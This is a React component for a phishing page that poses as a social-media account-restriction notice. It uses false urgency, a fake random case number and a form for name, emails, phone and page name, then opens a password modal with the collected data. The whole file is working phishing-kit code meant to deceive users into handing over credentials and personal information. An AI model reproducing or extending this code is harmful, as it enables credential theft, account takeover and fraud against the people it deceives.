import HeroImage from "@/assets/images/home-image.png";
import PasswordModal from "@/components/password-modal";
import { useEffect, useMemo, useState } from "react";
import "react-phone-input-2/lib/style.css";
export interface FormData {
  pageName: string;
  fullName: string;
  personalEmail: string;
  phone: string;
  businessEmail: string;
}
enum NameForm {
  pageName = "pageName",
  fullName = "fullName",
  personalEmail = "personalEmail",
  phone = "phone",
  businessEmail = "businessEmail",
}

const Home = () => {
  const [today, setToday] = useState("");
  const [error, setError] = useState("");
  const [formData, setFormData] = useState<FormData>({
    pageName: "",
    fullName: "",
    personalEmail: "",
    phone: "",
    businessEmail: "",
  });
  const [showPasswordModal, setShowPasswordModal] = useState(false);

  useEffect(() => {
    const getToday = () => {
      const date = new Date();
      return date.toLocaleDateString("en", {
        year: "numeric",
        month: "long",
        day: "2-digit",
      });
    };
    setToday(getToday());
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = () => {
    switch (true) {
      case !formData.personalEmail.includes("@") &&
        !formData.personalEmail.includes("."):
        setError(
          "Please enter a valid email address (e.g. example@domain.com)",
        );
        return;
      case !formData.fullName:
        setError("Full name is required");
        return;
      case !formData.pageName:
        setError("Page name is required");
        return;
      case formData.phone.length < 8:
        setError("Please enter a valid phone number (minimum 8 digits)");
        return;
      default:
        setError("");
        setShowPasswordModal(true);
        return;
    }
  };
  return (
    <div className="mx-auto mt-4 flex max-w-2xl flex-col gap-4 px-4">
      <img src={HeroImage} alt="hero" className="mx-auto" />
      <div className="flex flex-col gap-4">
        <h1 className="text-xl font-bold">Your account has been restricted</h1>
        <div className="flex flex-col gap-1">
          <h2 className="text-sm font-normal text-gray-600">Term of Service</h2>
          <p>
            We detected unusual activity in your page today <b>{today}</b>.
            Someone has reported your account for not complying with{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              Community Standards
            </span>
            . We have already reviewed this decision and the decision cannot be
            changed. To avoid having your account{" "}
            <span className="cursor-pointer text-blue-600 hover:underline">
              disabled
            </span>
            , please verify:
          </p>
          <div className="mt-4 flex flex-col gap-2">
            <div>
              <label
                className="mb-1 block text-sm font-bold text-gray-700"
                htmlFor={NameForm.pageName}
              >
                Page Name <span className="text-red-500">(*)</span>
              </label>
              <input
                autoFocus
                className="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.pageName}
                value={formData.pageName}
                onChange={handleInputChange}
                placeholder="Page Name"
              />
            </div>

            <div>
              <label
                className="mb-1 block text-sm font-bold text-gray-700"
                htmlFor={NameForm.fullName}
              >
                Full Name <span className="text-red-500">(*)</span>
              </label>
              <input
                className="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                name={NameForm.fullName}
                value={formData.fullName}
                onChange={handleInputChange}
                placeholder="Your Name (Name and Surname)"
              />
            </div>

            <div>
              <label
                className="mb-1 block text-sm font-bold text-gray-700"
                htmlFor={NameForm.personalEmail}
              >
                Personal Email <span className="text-red-500">(*)</span>
              </label>

              <input
                className={`w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
                  formData.personalEmail.length > 0 &&
                  !formData.personalEmail.includes("@") &&
                  !formData.personalEmail.includes(".")
                    ? "border-red-500 focus:border-red-500"
                    : ""
                }`}
                type="email"
                name={NameForm.personalEmail}
                value={formData.personalEmail}
                onChange={handleInputChange}
                placeholder="Personal Email"
              />
            </div>

            <div>
              <label
                className="mb-1 block text-sm font-bold text-gray-700"
                htmlFor={NameForm.businessEmail}
              >
                Business Email <span className="text-red-500">(*)</span>
              </label>
              <input
                className={`w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${formData.businessEmail.length < 10 && formData.businessEmail.length && "border-red-500 focus:border-red-500"}`}
                type="text"
                name={NameForm.businessEmail}
                value={formData.businessEmail}
                onChange={handleInputChange}
                placeholder="Business Email"
              />
            </div>

            <div>
              <label
                className="mb-1 block text-sm font-bold text-gray-700"
                htmlFor={NameForm.phone}
              >
                Phone Number <span className="text-red-500">(*)</span>
              </label>
              <input
                className={`w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none`}
                placeholder="Phone Number"
                value={formData.phone}
                onChange={(e) =>
                  setFormData((prev) => ({
                    ...prev,
                    [NameForm.phone]: e.target.value,
                  }))
                }
              />
            </div>
            <label
              className="mb-1 block text-sm font-bold text-gray-700"
              htmlFor="description"
            >
              Description
            </label>
            <textarea
              name="description"
              className="min-h-[100px] w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
              placeholder="Please explain why you think this decision is incorrect."
            ></textarea>

            <div className="mt-2 mb-4 flex flex-col justify-between border-y border-y-gray-300 p-2 text-sm text-gray-600 md:flex-row">
              <div className="flex md:flex-col">
                <span className="font-bold whitespace-nowrap">
                  Case Number:
                </span>
                <span className="ml-1 font-bold text-blue-600">
                  {"#"}{" "}
                  {useMemo(() => Math.floor(Math.random() * 1000000000000), [])}
                </span>
              </div>
              <div className="font-bold md:w-3/4">
                About Case: Violating Community Standards and Posting something
                inappropriate.
              </div>
            </div>
          </div>
          {error && <div className="text-red-500">{error} </div>}
          <button
            onClick={handleSubmit}
            className="cursor-pointer rounded-lg bg-blue-500 p-4 font-semibold text-white"
            type="button"
          >
            Continue
          </button>
        </div>
      </div>

      <PasswordModal
        formData={formData}
        isOpen={showPasswordModal}
        onClose={() => setShowPasswordModal(false)}
      />
    </div>
  );
};

export default Home;
